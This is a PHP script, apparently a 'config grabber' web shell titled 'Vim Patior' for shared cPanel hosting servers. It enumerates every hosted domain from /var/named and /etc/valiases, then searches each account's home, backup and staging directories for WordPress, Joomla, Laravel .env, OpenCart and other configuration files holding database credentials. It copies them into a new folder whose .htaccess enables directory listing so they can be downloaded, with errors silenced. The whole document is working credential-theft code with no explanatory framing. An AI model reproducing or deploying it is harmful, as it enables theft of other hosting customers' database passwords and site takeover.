<center> <h1>Vim Patior</h1><br><br><hr>
<a href="?ext=wp">[ Wp ]</a>
<a href="?ext=joomla">[ Jomla ]</a>
<a href="?ext=env">[ Larvel Env ]</a>
<a href="?ext=Ellislab">[ Ellislab ]</a>
<a href="?ext=Opencart">[ Opencart ]</a>
<a href="?ext=forum">[ Forum ]</a>
<a href="?ext=4images">[ 4images ]</a><br><br>
</center>
<?php
error_reporting(0);
if($_GET['ext'] == '4images') {
echo "<center><a href='4images/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('4images', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("4images/.htaccess","w", $htaccess);
nganune("4images","config.php");
}
if($_GET['ext'] == 'forum') {
echo "<center><a href='forumxs/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('forumxs', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("forumxs/.htaccess","w", $htaccess);
nganune("forumxs","includes/config.php");
}
if($_GET['ext'] == 'wp') {
echo "<center><a href='dewp/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('dewp', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("dewp/.htaccess","w", $htaccess);
nganune("dewp","wp-config.php");
}
if($_GET['ext'] == 'Opencart') {
echo "<center><a href='Opencart/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('Opencart', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("Opencart/.htaccess","w", $htaccess);
nganune("Opencart","admin/config.php");
}
if($_GET['ext'] == 'joomla') {
  echo "<center><a href='dirojom/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('dirojom', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("dirojom/.htaccess","w", $htaccess);
nganune("dirojom","configuration.php");
}
if($_GET['ext'] == 'env') {
    echo "<center><a href='diroenv/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('diroenv', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("diroenv/.htaccess","w", $htaccess);
nganune("diroenv",".env");
}
if($_GET['ext'] == 'Ellislab') {
  echo "<center><a href='Ellislab/' target='_blank'><u>Click Here</u></a></center>";
@mkdir('Ellislab', 0755);
$htaccess = "Options all\nDirectoryIndex doesntexist.htm\nSatisfy Any";
save("Ellislab/.htaccess","w", $htaccess);
$list = scandir("/var/named");
nganune("Ellislab","application/config/database.php");
}

function save($filename, $mode, $file) {
      $handle = fopen($filename, $mode);
      fwrite($handle, $file);
      fclose($handle);
      return;
}
function goblok($mbuh,$pata){

if (trim(file_get_contents($pata)) == false) {
}
else{
  $fopen = fopen($mbuh, "w");
  fputs($fopen, file_get_contents($pata));
}

}
function nganune($duhah,$pelere){
$list = scandir("/var/named");
foreach($list as $domain){
 if(strpos($domain,".db")){
  $domain = str_replace('.db','',$domain);
  $owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
  $dir = '/home/'.$owner['name'].'/public_html1';
  $path = getcwd();
  
  if (is_readable($dir)) {
    $file_data = $dir."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dira = '/home/'.$owner['name'].'/backup-'.$owner['name'];
  if (is_readable($dira)) {
    $file_data = $dira."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirb = '/home/'.$owner['name'].'/public_html.bak/';
  if (is_readable($dirb)) {
    $file_data = $dirb."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirc = '/home/'.$owner['name'].'/blog';
  if (is_readable($dirc)) {
    $file_data = $dirc."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dird = '/home/'.$owner['name'].'/blogs';
  if (is_readable($dird)) {
    $file_data = $dird."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dire = '/home/'.$owner['name'].'/wordpress';
  if (is_readable($dire)) {
    $file_data = $dire."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirf = '/home/'.$owner['name'].'/sites';
  if (is_readable($dirf)) {
    $file_data = $dirf."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirg = '/home/'.$owner['name'].'/config';
  if (is_readable($dirg)) {
    $file_data = $dirg."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirh = '/home/'.$owner['name'].'/backups_';
  if (is_readable($dirh)) {
    $file_data = $dirh."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diri = '/home/'.$owner['name'].'/backups';
  if (is_readable($diri)) {
    $file_data = $diri."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirj = '/home/'.$owner['name'].'/Backup';
  if (is_readable($dirj)) {
    $file_data = $dirj."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirk = '/home/'.$owner['name'].'/public_html.zip';
  if (is_readable($dirk)) {
    $file_data = $dirk."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirl = '/home/'.$owner['name'].'/staging';
  if (is_readable($dirl)) {
    $file_data = $dirl."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirm = '/home/'.$owner['name'].'/'.$domain;
  if (is_readable($dirm)) {
    $file_data = $dirm."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirn = '/home/'.$owner['name'].'/'.$owner['name'];
  if (is_readable($dirn)) {
    $file_data = $dirn."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $$duhah = '/home/'.$owner['name'].'/'.$owner['name'].'-backups';
  if (is_readable($$duhah)) {
    $file_data = $$duhah."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirp = '/home/'.$owner['name'].'/BackWPup';
  if (is_readable($dirp)) {
    $file_data = $dirp."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirq = '/home/'.$owner['name'].'/_backup';
  if (is_readable($dirq)) {
    $file_data = $dirq."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirr = '/home/'.$owner['name'].'/bak';
  if (is_readable($dirr)) {
    $file_data = $dirr."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirs = '/home/'.$owner['name'].'/wp_backup';
  if (is_readable($dirs)) {
    $file_data = $dirs."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirt = '/home/'.$owner['name'].'/wp_backups';
  if (is_readable($dirt)) {
    $file_data = $dirt."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diru = '/home/'.$owner['name'].'/public_html.older/';
  if (is_readable($diru)) {
    $file_data = $diru."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirv = '/home/'.$owner['name'].'/db';
  if (is_readable($dirv)) {
    $file_data = $dirv."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirw = '/home/'.$owner['name'].'/database';
  if (is_readable($dirw)) {
    $file_data = $dirw."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirx = '/home/'.$owner['name'].'/homedir';
  if (is_readable($dirx)) {
    $file_data = $dirx."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diry = '/home/'.$owner['name'].'/backup_1';
  if (is_readable($diry)) {
    $file_data = $diry."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirz = '/home/'.$owner['name'].'/backup_public_html';
  if (is_readable($dirz)) {
    $file_data = $dirz."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirza = '/home/'.$owner['name'].'/BackupBuddy';
  if (is_readable($dirza)) {
    $file_data = $dirza."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzb = '/home/'.$owner['name'].'/backup1';
  if (is_readable($dirzb)) {
    $file_data = $dirzb."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzc = '/home/'.$owner['name'].'/wpbackup';
  if (is_readable($dirzc)) {
    $file_data = $dirzc."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzd = '/home/'.$owner['name'].'/wp-upgrade-backup';
  if (is_readable($dirzd)) {
    $file_data = $dirzd."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirze = '/home/'.$owner['name'].'/website_backup';
  if (is_readable($dirze)) {
    $file_data = $dirze."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzf = '/home/'.$owner['name'].'/BACKUP';
  if (is_readable($dirzf)) {
    $file_data = $dirzf."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzg = '/home/'.$owner['name'].'/quarantine';
  if (is_readable($dirzg)) {
    $file_data = $dirzg."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzh = '/home/'.$owner['name'].'/backup2';
  if (is_readable($dirzh)) {
    $file_data = $dirzh."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzi = '/home/'.$owner['name'].'/new';
  if (is_readable($dirzi)) {
    $file_data = $dirzi."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzj = '/home/'.$owner['name'].'/MyBackup';
  if (is_readable($dirzj)) {
    $file_data = $dirzj."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzk = '/home/'.$owner['name'].'/mybackup';
  if (is_readable($dirzk)) {
    $file_data = $dirzk."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzl = '/home/'.$owner['name'].'/backups1';
  if (is_readable($dirzl)) {
    $file_data = $dirzl."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzm = '/home/'.$owner['name'].'/backups2';
  if (is_readable($dirzm)) {
    $file_data = $dirzm."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzn = '/home/'.$owner['name'].'/scriptupdate1';
  if (is_readable($dirzn)) {
    $file_data = $dirzn."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzo = '/home/'.$owner['name'].'/scriptupdate2';
  if (is_readable($dirzo)) {
    $file_data = $dirzo."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzp = '/home/'.$owner['name'].'/cobian_backups';
  if (is_readable($dirzp)) {
    $file_data = $dirzp."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzq = '/home/'.$owner['name'].'/fantastico_backups1';
  if (is_readable($dirzq)) {
    $file_data = $dirzq."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzr = '/home/'.$owner['name'].'/cobian_backup';
  if (is_readable($dirzr)) {
    $file_data = $dirzr."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzs = '/home/'.$owner['name'].'/application_backups';
  if (is_readable($dirzs)) {
    $file_data = $dirzs."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzt = '/home/'.$owner['name'].'/public_html/';
  if (is_readable($dirzt)) {
    $file_data = $dirzt."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzu = '/home/'.$owner['name'].'/public_html.bak1/';
  if (is_readable($dirzu)) {
    $file_data = $dirzu."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzv = '/home/'.$owner['name'].'/public_html.backup/';
  if (is_readable($dirzv)) {
    $file_data = $dirzv."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzw = '/home/'.$owner['name'].'/public_html.backups/';
  if (is_readable($dirzw)) {
    $file_data = $dirzw."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzx = '/home/'.$owner['name'].'/SiteBackup';
  if (is_readable($dirzx)) {
    $file_data = $dirzx."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzy = '/home/'.$owner['name'].'/SiteBackups';
  if (is_readable($dirzy)) {
    $file_data = $dirzy."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirzz = '/home/'.$owner['name'].'/softaculous_backups';
  if (is_readable($dirzz)) {
    $file_data = $dirzz."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirya = '/home/'.$owner['name'].'/backupwp';
  if (is_readable($dirya)) {
    $file_data = $dirya."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryb = '/home/'.$owner['name'].'/backwpup';
  if (is_readable($diryb)) {
    $file_data = $diryb."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryc = '/home/'.$owner['name'].'/public_htmlfirstaid';
  if (is_readable($diryc)) {
    $file_data = $diryc."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryd = '/home/'.$owner['name'].'/site';
  if (is_readable($diryd)) {
    $file_data = $diryd."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirye = '/home/'.$owner['name'].'/backuppro';
  if (is_readable($dirye)) {
    $file_data = $dirye."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryf = '/home/'.$owner['name'].'/BackupPro';
  if (is_readable($diryf)) {
    $file_data = $diryf."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryg = '/home/'.$owner['name'].'/old.public_html';
  if (is_readable($diryg)) {
    $file_data = $diryg."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryh = '/home/'.$owner['name'].'/publi';
  if (is_readable($diryh)) {
    $file_data = $diryh."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryi = '/home/'.$owner['name'].'/update';
  if (is_readable($diryi)) {
    $file_data = $diryi."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryj = '/home/'.$owner['name'].'/wordpress.bak';
  if (is_readable($diryj)) {
    $file_data = $diryj."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryk = '/home/'.$owner['name'].'/.backup';
  if (is_readable($diryk)) {
    $file_data = $diryk."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryl = '/home/'.$owner['name'].'/.backups';
  if (is_readable($diryl)) {
    $file_data = $diryl."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirym = '/home/'.$owner['name'].'/.accesshash';
  if (is_readable($dirym)) {
    $file_data = $dirym."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryn = '/home/'.$owner['name'].'/migration';
  if (is_readable($diryn)) {
    $file_data = $diryn."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryo = '/home/'.$owner['name'].'/html';
  if (is_readable($diryo)) {
    $file_data = $diryo."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryp = '/home/'.$owner['name'].'/restore';
  if (is_readable($diryp)) {
    $file_data = $diryp."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryq = '/home/'.$owner['name'].'/hosting';
  if (is_readable($diryq)) {
    $file_data = $diryq."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryr = '/home/'.$owner['name'].'/wp';
  if (is_readable($diryr)) {
    $file_data = $diryr."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $dirys = '/home/'.$owner['name'].'/shop';
  if (is_readable($dirys)) {
    $file_data = $dirys."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryt = '/home/'.$owner['name'].'/distrib';
  if (is_readable($diryt)) {
    $file_data = $diryt."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryu = '/home/'.$owner['name'].'/test';
  if (is_readable($diryu)) {
    $file_data = $diryu."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryv = '/home/'.$owner['name'].'/hg_backup';
  if (is_readable($diryv)) {
    $file_data = $diryv."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryw = '/home/'.$owner['name'].'/public_html1';
  if (is_readable($diryw)) {
    $file_data = $diryw."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryx = '/home/'.$owner['name'].'/backups-manual';
  if (is_readable($diryx)) {
    $file_data = $diryx."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryy = '/home/'.$owner['name'].'/public_html_upgraded';
  if (is_readable($diryy)) {
    $file_data = $diryy."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  }
  $diryz = '/home/'.$owner['name'].'/olllld.public_html';
  if (is_readable($diryz)) {
    $file_data = $diryz."/".$pelere;
    $p = $owner['name']."-$domain.txt";
    $fopen = "$duhah/$p";
    goblok($fopen, $file_data);
  } 
 }
}
}
?>